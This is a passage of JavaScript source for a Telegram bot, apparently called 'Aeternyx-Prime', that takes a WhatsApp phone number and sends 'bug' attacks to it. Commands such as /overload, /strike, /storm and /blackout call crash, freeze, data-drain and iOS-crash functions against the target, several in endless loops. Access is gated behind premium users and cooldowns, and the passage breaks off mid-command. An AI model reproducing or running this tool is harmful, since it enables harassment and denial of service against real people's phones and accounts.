    return ctx.reply(`⚠️ Format salah, contoh:\n/prime 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Prime
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Prime
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_prime_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_prime_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_prime_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Prime...\x1b[0m");

  (async () => {
  for (let i = 0; i < 1000; i++) {
    console.log(chalk.yellow(`Aeternyx Sending bug prime to ${target}`));
    await blankprime1(target);
    await sleep(delay);
    await blankprime2(target);
    await sleep(delay);
  }
})();

  console.log("\x1b[32m[SUCCESS] Sending Bug Prime\x1b[0m");

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type      : Prime
▣ Status        : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_prime_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Prime Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});
/////////---- CASE BUG 2 ----\\\\\\\\\\\\
bot.command("overload", checkWhatsAppConnection, checkPremium, async (ctx) => {
  if (!ctx.message) return;
  logPesanAeternyx(ctx);
  
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/overload 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Overload
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Overload
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_overload_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_overload_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_overload_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Overload...\x1b[0m");

  (async () => {
    while (true) {
      console.log(chalk.yellow(`Aeternyx Sending bug overload to ${target}`));
      await protocolbug7(target, true);
      await sleep(delay);
      await protocolbug8(target);
      await sleep(delay);
      await ExtraKuota1GB(target);
      await sleep(delay);
    }
  })();

  console.log("\x1b[32m[SUCCESS] Sending Bug Overload\x1b[0m");

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type      : Overload
▣ Status        : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_overload_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Overload Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});
//////////---- CASE BUG 3 ----\\\\\\\\\\\
bot.command("glacier", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/glacier 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${Name} (ID: ${userId})
▣ Bug Type     : Glacier
▣ Status       : Initializing...
▣ Progress     : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${Name} (ID: ${userId})
▣ Bug Type     : Glacier
▣ Status       : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_glacier_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_glacier_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_glacier_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Glacier...\x1b[0m");

  (async () => {
    while (true) {
      console.log(chalk.yellow(`Aeternyx Sending bug glacier to ${target}`));
    await PhotoDelay(target)
    await sleep(delay);
    }
  })();

  console.log("\x1b[32m[SUCCESS] Sending Bug Glacier\x1b[0m");

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Glacier
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_glacier_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Glacier Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});
/////////----- CASE BUG 4 -----\\\\\\\\\\\
bot.command("blood", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/blood 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Blood
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Blood
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_blood_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_blood_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_blood_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Blood...\x1b[0m");

  // Fungsi latar belakang untuk serangan terus menerus
  (async () => {
    for (let i = 0; i < 1; i++) {
      await ButtonHardInvisible(target, true);
      await sleep(delay);
      await freeze(target, true);
      await sleep(delay);
      await ExtraKuota1GB(target);
      await sleep(delay);
      console.log(chalk.yellow(`Aeternyx Sending bug blood to ${target}`));
    }
  })();

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target       : ${q}
▣ Requested by : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Blood
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_blood_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Blood Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});
/////////-------- CASE BUG 5 -----\\\\\\\\\
bot.command("strike", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/strike 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${Name} (ID: ${userId})
▣ Bug Type     : Strike
▣ Status       : Initializing...
▣ Progress     : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress     : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress     : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress     : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress     : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress     : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress     : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${Name} (ID: ${userId})
▣ Bug Type     : Strike
▣ Status       : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  // Kirim tombol konfirmasi
  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_strike_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_strike_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

// Handler untuk tombol YA
bot.action(/confirm_strike_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Strike...\x1b[0m");

  // Fungsi latar belakang untuk serangan terus menerus
  (async () => {
    while (true) {
      console.log(chalk.yellow(`Aeternyx Sending bug strike to ${target}`));
      await ButtonHardInvisible(target, true);
      await sleep(delay);
      await xPro(target, true);
      await sleep(delay);
      await freeze(target, true);
      await sleep(delay);
      await ExtraKuota1GB(target);
      await sleep(delay);
    }
  })();

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target       : ${q}
▣ Requested by : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Strike
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

// Handler untuk tombol BATAL
bot.action(/confirm_strike_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Strike Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("storm", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }
  
  if (!input) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/storm 6281234567890,1`);
  }

  const parts = input.split(",");
  if (parts.length < 2) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/storm 6281234567890,1`);
  }

  const q = parts[0].replace(/[^0-9]/g, "");
  const durInput = parseInt(parts[1]);
  if (isNaN(durInput) || durInput <= 0) {
    return ctx.reply("⚠️ Durasi harus berupa angka positif (jam).");
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q + "@s.whatsapp.net";
  const durInMs = durInput * 3600000; // konversi jam ke milidetik

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by : @${Name} (ID: ${userId})
▣ Duration      : ${durInput} Jam
▣ Bug Type     : Storm
▣ Status       : Initializing...
▣ Progress     : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress     : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress     : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress     : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress     : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress     : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress     : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${Name} (ID: ${userId})
▣ Duration      : ${durInput} Jam
▣ Bug Type     : Storm
▣ Status       : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\` dengan durasi *${durInput} jam*\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_storm_yes_${q}_${durInMs}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_storm_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_storm_yes_(\d+)_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const durInMs = parseInt(ctx.match[2]);
  const requesterId = ctx.match[3];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Storm...\x1b[0m");

  (async () => {
    for (let i = 0; i < 1; i++) {
    console.log(chalk.yellow(`Aeternyx    Sending bug storm to ${target}`));
    await CrashDelay(target, durInMs); 
  console.log(chalk.yellow(`Aeternyx Success Sending bug storm to ${target}`));
  }
  })();

  console.log("\x1b[32m[SUCCESS] Sending Bug Storm\x1b[0m");

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target   : ${q}
▣ Requested by: @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Storm
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_storm_no_(\d+)_(\d+)/, async (ctx) => {
  const q = ctx.match[1];
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Storm Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("blackout", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/blackout 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/jtv56b.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Blackout
▣ Status        : Initializing...
▣ Progress      : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▣ Progress : [█░░░░░░░░░] 10%", delay: 800 },
    { text: "▣ Progress : [███░░░░░░░] 30%", delay: 600 },
    { text: "▣ Progress : [█████░░░░░] 50%", delay: 550 },
    { text: "▣ Progress : [███████░░░] 70%", delay: 600 },
    { text: "▣ Progress : [█████████░] 90%", delay: 700 },
    { text: "▣ Progress : [██████████] 100%", delay: 1000 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
▣ Requested by  : @${Name} (ID: ${userId})
▣ Bug Type      : Blackout
▣ Status        : Executing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  await ctx.reply(
    `Konfirmasi Pengiriman Bug Ke \`${q}\`\n\nLanjutkan?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Ya, Lanjutkan", callback_data: `confirm_blackout_yes_${q}_${userId}` },
            { text: "❌ Batal", callback_data: `confirm_blackout_no_${q}_${userId}` }
          ]
        ]
      }
    }
  );
});

bot.action(/confirm_blackout_yes_(\d+)_(\d+)/, async (ctx) => {
  const delay = getGlobalDelay();
  const q = ctx.match[1];
  const requesterId = ctx.match[2];
  const target = q + "@s.whatsapp.net";

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Memulai eksekusi...");

  console.log("\x1b[35m[AETERNYX SYSTEM] => Sending Bug Blackout...\x1b[0m");

  (async () => {
    while (true) {
      await IpLocation(target, true);
      await sleep(delay);
      await TxIos(target, Ptcp = true);
      await sleep(delay);
      await selios(target);
      await sleep(delay);
      await VampiPhone(target);
      await sleep(delay);
      await VampCrashIos(target);
      await sleep(delay);
      await xataiphone(target);
      await sleep(delay);
      await IphoneDelay(Prime, target);
      await sleep(delay);
      console.log(chalk.yellow(`Aeternyx Sending bug blackout to ${target}`));
    }
  })();

  if (!ownerUsers.includes(Number(requesterId))) {
    setGlobalCooldown();
  }

  await ctx.editMessageText(
    `\`\`\`Aeternyx-Prime
▣ Target       : ${q}
▣ Requested by : @${ctx.from.username} (ID: ${ctx.from.id})
▣ Bug Type     : Blackout
▣ Status       : ✅ Successfully
\`\`\`©QudXyrine`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.action(/confirm_blackout_no_(\d+)_(\d+)/, async (ctx) => {
  const requesterId = ctx.match[2];

  if (ctx.from.id.toString() !== requesterId) {
    return ctx.answerCbQuery("⚠️ Kau Bukan Pemanggil Bug", { show_alert: true });
  }

  await ctx.answerCbQuery("Dibatalkan.");
  await ctx.editMessageText(
    `⚠️ Pengiriman Bug Blackout Dibatalkan Oleh @${ctx.from.username}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("spamui", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const Name = ctx.from.username;

  if (groupOnlyMode && !isGroup(ctx)) {
    return;
  }

  if (!q) {
    return ctx.reply(`⚠️ Format salah, contoh:\n/spamui 62xxxxxxxxxx`);
  }

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`⚡ Cooldown aktif! \nTunggu *${remainingTime} detik*`, {
      parse_mode: "Markdown",
    });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.sendPhoto("https://files.catbox.moe/9bm7k3.jpg", {
    caption: `\`\`\`Aeternyx-Prime
▣ Target        : ${q}
